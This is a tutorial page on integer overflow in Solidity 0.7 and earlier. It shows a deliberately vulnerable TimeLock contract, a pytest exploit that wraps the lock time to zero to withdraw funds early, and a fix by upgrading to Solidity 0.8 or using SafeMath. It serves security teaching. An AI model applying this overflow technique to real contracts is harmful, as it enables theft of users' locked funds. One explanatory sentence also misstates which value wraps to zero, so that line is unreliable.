---
sidebar_position: 2
tags: [overflow, solidity, attack]
---

# Overflow

:::caution DEPRECATED

This exploit is reproducible only in Solidity **version 7** and below. Since the release of the version **8**, the overflow code causes `VirtualMachineError` by default.

:::

### Description

An arithmetic overflow results from a calculation that exceeds the memory space designated to hold it, or the computation result is outside the range of the variable type. In simple applications, we would attempt to run the exploit that turns the positive number into 0, allowing us to perform the logic we would not perform otherwise.

Consider the following smart contract:

```solidity title=/contracts/overflow/TimeLock.sol#L14 sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLock.sol#L14 
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        // highlight-next-line
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(block.timestamp > lockTime[msg.sender]);
        uint256 transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        address payable receiver = payable(msg.sender);
        receiver.transfer(transferValue);
    }

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }

    function lockTimeOf(address _user) public view returns (uint256) {
        return lockTime[_user];
    }
}
```

On line 14, the arithmetic operation updates the user's balance lock time. The `uint256` variable holds the values from 0 up until 2^256 - 1, which is precisely 256 bits. If we try to assign a new value more than 2^256 - 1, e.g., 2^256, the `_secondsToIncrease` will become 0. The types work circularly in this case, so once the limit is reached, the variable starts from 0.

So the attacker might exploit this behavior to overcome the funds lock time and perform the withdrawal earlier.

### How to test

Let's simulate the attack that via python unit test. The highlighted lines 22-24 below execute the overflow attack:

```python sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py title=/tests/overflow/test_time_lock.py 
import pytest
from brownie import exceptions
from scripts.utils import get_attacker_account, get_user_account
from scripts.overflow.deploy_and_attack import deploy_time_lock, deploy_time_lock_fixed
from web3 import Web3


def test_time_lock_immediate_withdrawal_successful():
    # 1. Deploy TimeLock smart contract
    time_lock = deploy_time_lock()

    # 2. User deposits 1 ETH on the time lock smart contract balance
    deposit_tx = time_lock.deposit(
        {"from": get_user_account(), "value": Web3.toWei(1, "ether")}
    )
    deposit_tx.wait(1)

    # Let's keep track of the user balance, ETH
    user_balance = get_user_account().balance() / 10**18

    # 3. Execute the overflow attack
    #  highlight-next-line
    increase_tx = time_lock.increaseLockTime(
    #  highlight-next-line
        pow(2, 256) - time_lock.lockTimeOf(get_user_account().address),
    #  highlight-next-line
        {"from": get_user_account()},
    )
    increase_tx.wait(1)

    # 4. Since the lock time is 0, we can easily withdraw the ETH
    withdraw_tx = time_lock.withdraw({"from": get_user_account()})
    withdraw_tx.wait(1)

    # So it should not be possible for user to withdraw the ETH, but the user's 1 ETH is back on his balance
    assert get_user_account().balance() / 10**18 == user_balance + 1

```

This test should successfully pass, and the user gets his 1 ETH back on his balance immediately.

Also, consider running the brownie [script](https://github.com/kkateq/solidity-hacks/blob/main/scripts/overflow/deploy_and_attack.py#L28) as well instead of the unit test to follow transactions log.


### How to fix

If you would use solidity prior v8, it's necessary to use safe math libraries to fix this problem. One of the examples is the [SafeMath](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol) from OpenZeppelin. The best option is to upgrade Solidity to v8. 


### Demo

I [chose](https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLockFixed.sol#L2) upgrading Solidity version to fix the problem. Additionally, this points again that using the latest available solidity version is the safest option to go.

Check out the unit test that now fails to exploit the contract:

```python title=/tests/overflow/test_time_lock.py#L34 sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py#L34
def test_time_lock_fixed_immediate_withdrawal_failed():
    # 1. Deploy TimeLock contract
    time_lock = deploy_time_lock_fixed()

    # 2. Deposit funds using another user account
    deposit_tx = time_lock.deposit(
        {"from": get_user_account(), "value": Web3.toWei(1, "ether")}
    )

    user_balance = get_user_account().balance() / 10**18

    deposit_tx.wait(1)

    # 3. Execute attack
    #  highlight-next-line
    with pytest.raises(exceptions.VirtualMachineError):
        increase_tx = time_lock.increaseLockTime(
            pow(2, 256) - time_lock.lockTimeOf(get_user_account().address),
            {"from": get_user_account()},
        )
        increase_tx.wait(1)

    assert get_user_account().balance() / 10**18 == user_balance
```

**Thank you for reading and good luck with building secure blockchain!**